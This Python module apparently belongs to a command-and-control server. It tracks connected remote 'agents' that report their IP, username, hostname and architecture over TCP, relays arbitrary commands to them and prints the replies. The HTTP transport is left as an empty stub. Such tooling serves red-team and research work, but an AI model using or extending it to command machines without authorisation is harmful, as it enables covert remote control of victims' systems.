from core.utils.config import CONFIG
from core.agents import commands
from core.utils import common
from core.transport import tcp

from dataclasses import dataclass

AGENTS = {}

@dataclass
class Agent:
    id: str
    ip: str
    username: str
    conn: any
    conn_type: str
    # timestamp: datetime = common.time_now()
    status: str = "active"
    interval: str = ""
    hostname: str = ""
    arch: str = ""

def handle(conn, addr, conn_type="tcp"):
    
    match conn_type:
        case "tcp":
            handle_tcp(conn, addr)
        case "http":
            pass
        
        case _:
            pass

def handle_tcp(conn, addr):

    while True:
        id = common.new_id()
        if id not in AGENTS:
            break

    _, data = tcp.recv_data(conn)
    ip, username, hostname, arch = data.split(CONFIG.agent.seperator)


    agent = Agent(
        id=id,
        ip=ip,
        username=username,
        hostname=hostname,
        conn=conn,
        conn_type="tcp",
        interval="real-time",
        arch=arch,
    )

    AGENTS[id] = agent
    print(f"[+] New agent connected: {agent}")



def handle_http():
    pass



def handle_command(agent_id: str, cmd: str):
    agent = AGENTS.get(agent_id)

    if not agent:
        print(f"[!] Agent {agent_id} not found.")
        return

    if agent.status != "active":
        print(f"[!] Agent {agent_id} is not active.")
        return

    conn = agent.conn
    try:
        tcp.send_data(conn, cmd)
        print(f"[+] Sent command to {agent_id}: {cmd}")
    except Exception as e:
        print(f"[!] Failed to send command to {agent_id}: {e}")
        agent.status = "dead"
        tcp.close(conn)
    else:
        try:
            response = tcp.recv_data(conn)
            print(f"[+] Response from {agent_id}:\n{response}")
        except Exception as recv_err:
            print(f"[!] Error receiving response from {agent_id}: {recv_err}")
            agent.status = "dead"
            tcp.close(conn)
